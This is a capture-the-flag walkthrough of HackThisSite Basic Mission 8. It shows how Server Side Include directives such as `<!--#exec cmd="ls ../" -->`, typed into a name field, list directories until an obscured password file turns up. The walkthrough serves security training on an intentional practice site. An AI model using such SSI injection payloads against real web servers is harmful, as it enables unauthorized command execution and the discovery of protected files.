
> [!NOTE] 
> Sam remains confident that an obscured password file is still the best idea, but he screwed up with the calendar program. Sam has saved the unencrypted password file in /var/www/hackthissite.org/html/missions/basic/8/  
> 
> However, Sam's young daughter Stephanie has just learned to program in PHP. She's talented for her age, but she knows nothing about security. She recently learned about saving files, and she wrote a script to demonstrate her ability.

Sam is still out here acting like an obscured filename counts as security, but at least he's stopped pretending his cal script was a good idea

we already know we're better at this than he is, so let's keep reminding him who actually runs this place

This time he made it so easy a student of Gloriosa 32 could clear it, the description gives away basically everything

the real password file lives directly in the level 8 directory, same tired trick as Level 7

And now there's a new script from Sam's daughter, who "knows nothing about security", great, another amateur hour to pick apart

Hit level8.php to see what the script actually does

hackthissite.org/missions/basic/8/level8.php -->

```
Your file has been saved. Please click <a href="[tmp/skkfaosa.shtml](view-source:https://www.hackthissite.org/missions/basic/8/tmp/skkfaosa.shtml)">here</a> view the file.
```

Following that link

/tmp/skkfaosa.shtml -->
```
Hi, ! Your name contains 0 characters.
```

The file extension is .shtml, means the server is processing Server Side Includes (SSI), that's a format prone to injection if user input reaches it unsanitized

First attempt, a generic command
`<!--#exec cmd="whoami" -->`

Blocked, but informatively so

```
If you are trying to use server side includes to solve the challenge, you are on the right track: but I have limited the commands allowed to ones relevant towards finding the password file for security reasons(because there will always be that one person who decides to execute some rather nasty commands). So please manipulate your code so that it is a little more pertaining to the level.
```

So arbitrary command execution is filtered, but the hint confirms SSI injection is the intended path, just scoped to file-discovery commands. `ls` got through

`<!--#exec cmd="ls" -->`

```
Hi, tshngmww.shtml hipykpqu.shtml ztxdhjxn.shtml avpfeoie.shtml fviqpmaw.shtml kqbybdzc.shtml dzrnmzgx.shtml npcsygfl.shtml whqxxojt.shtml ylomcmvu.shtml uhdppswp.shtml gzntiicx.shtml dzwbqiuu.shtml qvzuieng.shtml smcerykh.shtml qjhnmhmq.shtml znodwztr.shtml! Your name contains 254 characters.
```

Nothing but junk `.shtml` files in the current (`tmp/`) directory

Typical Sam-adjacent setup, the useful stuff is never where they leave it in plain sight.


Since ls works, walking up one level is the obvious next move

`<!--#exec cmd="ls ../" -->`

```
Hi, au12ha39vc.php index.php level8.php tmp! Your name contains 39 characters.
```

`au12ha39vc.php` is the obscured password file the challenge description promised, sitting one directory above the SSI sandbox

